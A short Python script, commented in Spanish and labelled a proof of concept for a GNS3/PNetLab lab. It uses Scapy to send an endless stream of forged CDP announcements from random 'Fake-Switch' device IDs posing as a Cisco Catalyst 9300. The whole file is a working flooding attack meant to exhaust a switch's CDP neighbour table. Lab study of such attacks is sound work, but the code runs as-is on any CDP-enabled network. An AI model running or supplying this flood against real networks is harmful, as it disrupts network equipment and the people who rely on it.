#!/usr/bin/env python3

from scapy.contrib import cdp
from scapy.all import Ether, LLC, SNAP, sendp
import random
import string
import time

def generar_id_aleatorio(length=8):
    """Genera un nombre de dispositivo aleatorio."""
    letras = string.ascii_letters + string.digits
    return "Fake-Switch-" + ''.join(random.choice(letras) for i in range(length))

def cdp_flood_poc(interfaz="eth0"):
    print(f"[*] Iniciando PoC de inundación CDP en {interfaz}...")
    print("[*] Presiona Ctrl+C para detener y limpiar la tabla en el switch.")

    # La base de la trama no cambia, la podemos definir fuera
    packet_base = Ether(dst="01:00:0c:cc:cc:cc") / LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP()

    try:
        while True:
            # Creamos un ID aleatorio para cada iteración
            nuevo_id = generar_id_aleatorio()
            
            # Construimos el cuerpo del paquete CDP
            cdp_payload = cdp.CDPv2_HDR(vers=2, ttl=180)
            cdp_payload /= cdp.CDPMsgDeviceID(val=nuevo_id)
            cdp_payload /= cdp.CDPMsgPlatform(val="Cisco Catalyst 9300")
            cdp_payload /= cdp.CDPMsgPortID(iface="GigabitEthernet0/1")
            cdp_payload /= cdp.CDPMsgCapabilities(cap=0x0008) # Capacidad de Switch

            # Unimos todo
            final_frame = packet_base / cdp_payload
            
            # Enviamos. inter=0.1 para que sea rápido pero procesable.
            sendp(final_frame, iface=interfaz, verbose=False)
            print(f"[+] Enviado anuncio para: {nuevo_id}")
            
            # Un pequeño delay para no colgar tu propia PC
            time.sleep(0.1) 

    except KeyboardInterrupt:
        print("\n[!] PoC finalizada.")

if __name__ == "__main__":
    # Cambia "eth0" por el nombre de tu interfaz en GNS3/PNetLab
    cdp_flood_poc("eth0")
